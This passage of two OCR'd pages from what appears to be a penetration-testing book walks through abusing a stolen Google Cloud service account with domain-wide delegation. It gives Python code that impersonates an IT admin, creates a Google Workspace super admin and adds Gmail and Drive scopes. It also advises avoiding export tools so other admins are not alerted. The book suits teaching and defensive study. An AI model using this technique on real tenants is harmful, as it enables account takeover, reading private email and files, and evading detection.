- pgno: 252
  md: "The service account is named userprovisionning@gp-gsuite-262115.iam.gserviceaccount.com\
    \ and is attached to the Google Cloud project gp-gsuite-262115. Not Google Workspace,\
    \ mind you. Google Cloud. Since Google Workspace does not handle service tokens,\
    \ anyone wanting to automate their Google Workspace administration must create\
    \ a service token on Google Cloud and then assign scopes and permissions to that\
    \ account on Google Workspace. It can't get any messier than that!\n\nWe already\
    \ know that this service token has the necessary permissions to create a user,\
    \ so let's help ourselves to a super admin account on Google Workspace.\n\n# Creating\
    \ a Google Workspace Super Admin Account\n\nYou can find the full Python code\
    \ in the book's GitHub repository as create_user.py, so I'll just highlight the\
    \ key points.\n\nFirst, we need to declare the scope of the actions our account\
    \ will perform on Google Workspace. Since we will create a new account, we need\
    \ the scope admin.directory.user. We follow this bit with the location of the\
    \ service token file and the email we will impersonate to carry out our actions:\n\
    \n```\nSCOPES = ['https://www.googleapis.com/auth/admin.directory.user']\nSERVICE_ACCOUNT_FILE\
    \ = 'token.json'\nUSER_EMAIL = \"admin-it@gretschpolitico.com\"\n```\n\nIn Google's\
    \ security model, a service account cannot directly act on user accounts; it needs\
    \ first to impersonate a real user using domain-wide delegation privileges, configured\
    \ on the service account's properties. Actions are then carried over with the\
    \ privileges of the impersonated user, so we'd better find a super admin to impersonate.\n\
    \nNo problem. We try putting in the email of the owner of the AWS GP IT account\
    \ we found in Listing 13-3 when enumerating existing AWS accounts: admin-it@gretschpolitico.com.\n\
    \nNext comes boilerplate Python code to build the Google Workspace client and\
    \ impersonate the IT admin:\n\n```\ncredentials = (service_account.Credentials.\n\
    \    from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES))\n\ndelegated_credentials\
    \ = credentials.with_subject(USER_EMAIL)\nservice = discovery.build('admin', 'directory_v1',\
    \ credentials=delegated_credentials)\n```\n\nWe build a dictionary with our desired\
    \ user attributes (name, password, and so on), then execute the query:\n\n```\n\
    user = {\"name\": {\"familyName\": \"Burton\", \"givenName\": \"Haniel\"},\n \
    \   \"password\": \"Strong45Password*\", \"primaryEmail\": \"hanielle@gretschpolitico.com\"\
    ,\n    \"orgUnitPath\": \"/\" }\n\nresult = service.users().insert(body=user).execute()\n\
    ```"
  merge: -1
  img_proc: true
- pgno: 253
  md: "The final step is to make our user super admin over the entire organization:\n\
    \n```\nservice.users().makeAdmin(userKey=\"hanielle@gretschpolitico.com\",\n \
    \   body={\"status\": True}).execute()\n```\n\nNow we just run the file:\n\n```\n\
    root@Point1:~# python create_user.py\n```\n\nNo errors. Did it really work? We\
    \ open our browser and head to the Google Workspace Admin console, https://admin.google.com/,\
    \ as shown in Figure 13-1.\n\n![](img/961e81aef23040d0fbe348f58c055860_253_0.png)\n\
    \nFigure 13-1: Access to our newly created Google Workspace account\n\nIt bloody\
    \ did! We have just achieved admin access to GP's corporate directory. Nothing\
    \ is beyond reach now: Gmails, Google Drive, you name it.\n\n# Sneaking a Peek\n\
    \nTo keep a low profile, we will avoid using the export features and data migration\
    \ utilities of Google Workspace. Google automatically alerts other admins when\
    \ anyone triggers these tasks. We will exclusively interact with Google Workspace\
    \ the way we have so far: through API calls. We just need to upgrade the scope\
    \ of the user-provisioning service account we grabbed from Secrets Manager to\
    \ include Gmail and Google Drive access.\n\nIn the Google Workspace Admin console,\
    \ we navigate to the Security ▶ Advanced Settings ▶ Manage API Access panel and\
    \ enter the following two scopes in the One or More API Scores field, shown in\
    \ Figure 13-2:\n\n+   - https://www.googleapis.com/auth/drive\n- https://www.googleapis.com/auth/gmail.readonly\n\
    \nIn the Client Name field, we write the service account's name, userprovisioning@gp-gsuite-262115.iam.gserviceaccount.com,\
    \ which gets converted to a unique ID."
